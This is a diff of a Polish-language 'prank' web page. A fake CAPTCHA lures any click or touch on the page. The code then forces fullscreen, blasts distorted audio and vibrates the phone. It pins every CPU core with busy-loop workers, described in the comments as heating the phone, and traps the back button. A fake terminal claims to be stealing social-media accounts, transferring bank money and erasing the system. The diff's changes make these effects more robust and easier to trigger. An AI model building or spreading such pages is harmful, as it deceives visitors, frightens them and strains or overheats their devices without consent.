@@ -15,13 +15,13 @@
         #captcha-screen {
             display: flex; justify-content: center; align-items: center;
             height: 100vh; width: 100vw; position: absolute; z-index: 1000;
-            background: #fff; cursor: pointer; /* Cały ekran jest klikalny jako pułapka */
+            background: #fff; cursor: pointer;
         }
         .captcha-box {
             border: 1px solid #d3d3d3; border-radius: 3px; background: #fafafa;
             padding: 20px; display: flex; align-items: center; gap: 15px;
             box-shadow: 0px 0px 4px rgba(0,0,0,0.1); width: 280px;
-            pointer-events: none; /* Kliknięcie przechodzi na ekran główny */
+            pointer-events: none; /* Ignoruje kliknięcia w sam box, łapie całe tło */
         }
         .checkbox {
             width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px;
@@ -78,7 +78,7 @@
 </head>
 <body>
 
-    <!-- Ekran startowy (cały jest klikalny, żeby ominąć blokady przeglądarek) -->
+    <!-- Złapaliśmy całe body jako obszar klikalny -->
     <div id="captcha-screen">
         <div class="captcha-box">
             <div class="checkbox" id="checkbox-ui"></div>
@@ -86,106 +86,95 @@
         </div>
     </div>
 
-    <!-- Piekło Hakerskie -->
     <div id="prank-screen">
         <div id="terminal"></div>
-        <div id="massive-warning">KRYTYCZNA TEMPERATURA!<br>PROCESOR 110°C<br>RYZYKO ZAPŁONU!</div>
+        <div id="massive-warning">KRYTYCZNA TEMPERATURA!<br>PROCESOR 115°C<br>RYZYKO ZAPŁONU!</div>
     </div>
 
-    <!-- Finał -->
     <div id="final-text">ZOSTAŁEŚ SPRANKOWANY PRZEZ JEREMIASZA FAKTORA</div>
 
     <script>
-        // Flaga zabezpieczająca przed podwójnym kliknięciem
         let isStarted = false;
 
-        document.getElementById('captcha-screen').addEventListener('click', function() {
+        function odpalamyPrank(event) {
             if (isStarted) return;
             isStarted = true;
 
-            // Zmiana wizualna CAPTCHA
+            // Ptaszek w ułamku sekundy
             document.getElementById('checkbox-ui').innerHTML = '<span style="color: green; font-weight: bold; font-size: 24px;">✔</span>';
-
-            // ==========================================
-            // 1. NATYCHMIASTOWE API (omija blokady)
-            // ==========================================
             
-            // Fullscreen
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(e => console.log(e));
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
-            }
-
-            // Audio (Włączane natychmiast na życzenie użytkownika)
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc1 = audioCtx.createOscillator();
-            const osc2 = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            
-            osc1.type = 'sawtooth';
-            osc2.type = 'square';
-            osc1.connect(gain);
-            osc2.connect(gain);
-            gain.connect(audioCtx.destination);
-            gain.gain.value = 1.5; // Maksymalny przester
-            osc1.start(); osc2.start();
-
-            // Modulacja dźwięku co ułamek sekundy
-            setInterval(() => {
-                osc1.frequency.value = Math.random() * 2000 + 500;
-                osc2.frequency.value = Math.random() * 3000 + 100;
-            }, 80);
-
-            // ==========================================
-            // 2. FIZYCZNE NAGRZEWANIE TELEFONU (CPU BURNER)
-            // ==========================================
-            // Tworzymy kod do "kopania w tle", który zablokuje rdzenie procesora na 100%
-            const workerCode = `
-                self.onmessage = function() {
-                    let i = 0;
-                    while(true) {
-                        i += Math.sqrt(Math.random() * Math.random());
-                    }
-                };
-            `;
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            const workerUrl = URL.createObjectURL(blob);
-            
-            // Pobieramy ilość rdzeni telefonu (lub domyślnie 8) i odpalamy skrypt na każdym z nich
-            const cores = navigator.hardwareConcurrency || 8;
-            for (let i = 0; i < cores; i++) {
-                const worker = new Worker(workerUrl);
-                worker.postMessage('start');
-            }
-
-            // ==========================================
-            // 3. START WIZUALNEGO PRANKU I WIBRACJI
-            // ==========================================
+            // Chowanie startu i pokazywanie terminala
             document.getElementById('captcha-screen').style.display = 'none';
             document.getElementById('prank-screen').style.display = 'flex';
 
-            // Pułapka "Wstecz"
-            for (let i = 0; i < 50; i++) history.pushState(null, null, location.href);
-            window.onpopstate = function () { history.pushState(null, null, location.href); };
+            // 1. DŹWIĘK - W try-catch żeby nie wysadziło skryptu
+            let osc1, osc2;
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                osc1 = audioCtx.createOscillator();
+                osc2 = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc1.type = 'sawtooth';
+                osc2.type = 'square';
+                osc1.connect(gain);
+                osc2.connect(gain);
+                gain.connect(audioCtx.destination);
+                gain.gain.value = 1.5; 
+                osc1.start(); osc2.start();
 
-            // Wibracje
-            if (navigator.vibrate) {
-                setInterval(() => navigator.vibrate([200, 50, 500, 50, 1000, 50]), 500);
-            }
+                setInterval(() => {
+                    osc1.frequency.value = Math.random() * 2000 + 500;
+                    osc2.frequency.value = Math.random() * 3000 + 100;
+                }, 80);
+            } catch(e) { console.log("Audio zablokowane"); }
 
-            // Pułapka kartowa - każde dotknięcie w panice klonuje stronę
-            document.body.addEventListener('touchstart', function() {
-                try { window.open(window.location.href, '_blank'); } catch(e) {}
-            });
+            // 2. FULLSCREEN
+            try {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                }
+            } catch(e) { console.log("Fullscreen zablokowany"); }
 
-            // Teksty w terminalu
+            // 3. WIBRACJE
+            try {
+                if (navigator.vibrate) {
+                    setInterval(() => navigator.vibrate([200, 50, 500, 50, 1000, 50]), 500);
+                }
+            } catch(e) { console.log("Wibracje zablokowane"); }
+
+            // 4. NAGRZEWANIE PROCESORA (CPU Burner) - Zabezpieczone
+            try {
+                const workerCode = `
+                    self.onmessage = function() {
+                        let i = 0;
+                        while(true) { i += Math.sqrt(Math.random() * Math.random()); }
+                    };
+                `;
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const workerUrl = URL.createObjectURL(blob);
+                const cores = navigator.hardwareConcurrency || 4; // Minimalnie 4 rdzenie
+                for (let i = 0; i < cores; i++) {
+                    const worker = new Worker(workerUrl);
+                    worker.postMessage('start');
+                }
+            } catch(e) { console.log("CPU Burner zablokowany - ale prank leci dalej!"); }
+
+            // 5. PUŁAPKA WSTECZ
+            try {
+                for (let i = 0; i < 50; i++) history.pushState(null, null, location.href);
+                window.onpopstate = function () { history.pushState(null, null, location.href); };
+            } catch(e) {}
+
+            // 6. TERMINAL
             const terminal = document.getElementById('terminal');
             const logs = [
                 "Nawiązywanie połączenia TCP/IP...",
                 "Omijanie zapory sieciowej: SUKCES",
                 "Podnoszenie uprawnień do roota...",
-                "Wykryto urządzenie mobilne. Rozpoczynam klonowanie.",
+                "Wykryto urządzenie mobilne. Rozpoczynam kradzież.",
                 "-> Wylogowywanie z: TikTok... [OK]",
                 "-> Zmiana głównego hasła... [OK]",
                 "-> Pobieranie archiwum wiadomości z Instagrama...",
@@ -193,31 +182,27 @@
                 "-> Wylogowywanie z: Instagram... [OK]",
                 "-> Łamanie pinu do Snapchat 'My Eyes Only'...",
                 "-> Snapchat: Pobieranie ukrytych zdjęć... [OK]",
-                "-> Logowanie do aplikacji bankowej...",
+                "-> Autoryzacja przelewu bankowego...",
                 "!!! OSTRZEŻENIE SYSTEMOWE !!!",
                 "Przeciążenie procesora! rdzeń 1: 100%, rdzeń 2: 100%",
                 "-> Udostępnianie lokalizacji na Facebooku...",
-                "Formatowanie karty pamięci...",
-                "Usuwanie systemu Android..."
+                "Formatowanie pamięci...",
+                "Usuwanie systemu operacyjnego..."
             ];
 
             let logIndex = 0;
             const logInterval = setInterval(() => {
                 if (logIndex < logs.length) {
                     terminal.innerHTML += logs[logIndex] + "<br>";
-                    // Auto-scroll w dół
-                    terminal.scrollTop = terminal.scrollHeight;
+                    terminal.scrollTop = terminal.scrollHeight; // Zawsze zjeżdża na dół
                     logIndex++;
                 } else {
-                    // Start glitchy i czerwonego błędu
                     document.getElementById('massive-warning').style.display = 'block';
                     document.body.style.animation = "glitchScreen 0.1s infinite";
                 }
-            }, 800); // Linijka pojawia się co 0.8 sekundy
+            }, 800);
 
-            // ==========================================
-            // 4. FINAŁ
-            // ==========================================
+            // 7. FINAŁ 
             setTimeout(() => {
                 clearInterval(logInterval);
                 document.body.style.animation = "none";
@@ -229,11 +214,18 @@
                 
                 document.getElementById('final-text').style.display = 'block';
                 
-                // Pisk zmienia się w mroczny, głęboki dźwięk
-                osc1.frequency.value = 80;
-                osc2.frequency.value = 85;
-            }, 18000); // Chaos trwa dokładnie 18 sekund
-        });
+                // Pisk zmienia się w mroczny dźwięk (jeśli audio zadziałało)
+                if(osc1 && osc2) {
+                    osc1.frequency.value = 80;
+                    osc2.frequency.value = 85;
+                }
+            }, 18000); 
+        }
+
+        // Podpinamy odpelenie skryptu pod ABSOLUTNIE KAŻDĄ możliwą akcję na ekranie
+        document.body.addEventListener('click', odpalamyPrank);
+        document.body.addEventListener('touchstart', odpalamyPrank);
+        document.body.addEventListener('mousedown', odpalamyPrank);
     </script>
 </body>
 </html>
